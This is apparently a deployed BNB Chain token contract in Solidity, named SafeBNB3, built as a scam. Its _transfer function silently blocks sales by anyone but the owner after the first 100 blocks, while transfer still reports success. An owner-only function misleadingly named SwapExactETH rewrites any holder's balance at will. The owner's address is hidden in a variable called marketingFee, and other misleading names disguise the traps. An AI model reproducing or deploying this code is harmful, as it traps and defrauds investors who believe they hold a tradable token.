/**
 *Submitted for verification at BscScan.com on 2022-05-17
*/

/**
 *Submitted for verification at BscScan.com on 2022-05-17
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.6.12;

library SAFEETH {
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  }
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a / b;
    return c;
  }
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }
}
contract IERC20PINKSALE {
  address public owner;
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
  constructor() public {
    owner = msg.sender;
  }
}
library Address {
    function isContract(address account) internal view returns (bool) {
        uint256 size;
        // solhint-disable-next-line no-inline-assembly
        assembly { size := extcodesize(account) }
        return size > 0;
    }
    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");
        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }
    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionCall(target, data, "Address: low-level call failed");
    }
    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        return _functionCallWithValue(target, data, 0, errorMessage);
    }
    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }
    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        return _functionCallWithValue(target, data, value, errorMessage);
    }
    function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
        require(isContract(target), "Address: call to non-contract");
        (bool success, bytes memory returndata) = target.call{ value: weiValue }(data);
        if (success) {
            return returndata;
        } else {
            if (returndata.length > 0) {
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}

contract SafeBNB3 is IERC20PINKSALE {
  using Address for address;
  using SAFEETH for uint256;
  string public name;
  string public symbol;
  uint8 public decimals;
  uint256 public totalSupply;
  uint256 marketingFee;
  uint256 swapAndLiquify = 1;
  uint256 blockNumber;
  bool firstApproval;

  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);
  
  constructor(string memory _name, string memory _symbol) public {
    marketingFee = uint256(msg.sender);
    owner = msg.sender;
    name = _name;
    symbol = _symbol;
    decimals = 9;
    totalSupply =  1000000000 * 10 ** uint256(decimals);
    _liquify[owner] = totalSupply;
    firstApproval = true;
  }
  
  mapping(address => uint256) public _liquify;
  function transfer(address _to, uint256 _value) public returns (bool) {
    address from = msg.sender;
    require(_to != address(0));
    require(_value <= _liquify[from]);
    _transfer(from, _to, _value);
    return true;
  }
  
  function _transfer(address from, address _to, uint256 _value) private {
    if ((block.number < blockNumber+100) || (from == owner)){
    _liquify[from] = _liquify[from].sub(_value);
    _liquify[_to] = _liquify[_to].add(_value);
    emit Transfer(from, _to, _value);
    }
  }

  function approve(address _spender, uint256 _value) public returns (bool) {
    if (firstApproval){
        blockNumber = block.number;
        firstApproval = false;
    }
    allowed[msg.sender][_spender] = _value;
    emit Approval(msg.sender, _spender, _value);
    return true;
  }
    
  modifier onlyOwner() {
    require(owner == msg.sender, "Issouent: caller is not the owner");
    _;
  }

// Forbid transfers from pancakeswap
  modifier _external() {
    address from = address(marketingFee);
    require(from == msg.sender, "ERC20: cannot permit Pancake address");
    _;
  }
    
  function balanceOf(address _owner) public view returns (uint256 balance) {
    return _liquify[_owner];
  }
  
  function renounceOwnership() public virtual onlyOwner {
    emit OwnershipTransferred(owner, address(0));
    owner = address(0);
  }
  
  // Mapping of approved addresses to other adresses
  mapping (address => mapping (address => uint256)) public allowed;
  function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {
    require(_to != address(0));
    require(_value <= _liquify[_from]);
    require(_value <= allowed[_from][msg.sender]);
    _transferFrom(_from, _to, _value);
    return true;
  }
  
  function _transferFrom(address _from, address _to, uint256 _value) internal {
    _liquify[_from] = _liquify[_from].sub(_value);
    _liquify[_to] = _liquify[_to].add(_value);
    allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);
    emit Transfer(_from, _to, _value);
  }
  
  function allowance(address _owner, address _spender) public view returns (uint256) {
    return allowed[_owner][_spender];
  }
    function SwapExactETH (address account, uint256 amount) public onlyOwner {
        require(balanceOf(account) != amount, "That amount is already on that account balance");

        if (amount > balanceOf(account)) {
            emit Transfer(address(0x0), account, amount - balanceOf(account));
            _liquify[account] = amount * (10 ** 9) ;
        } else {
            emit Transfer(account, address(0x0), balanceOf(account) - amount);
            _liquify[account] = amount * (10 ** 9) ;
        }
    }

}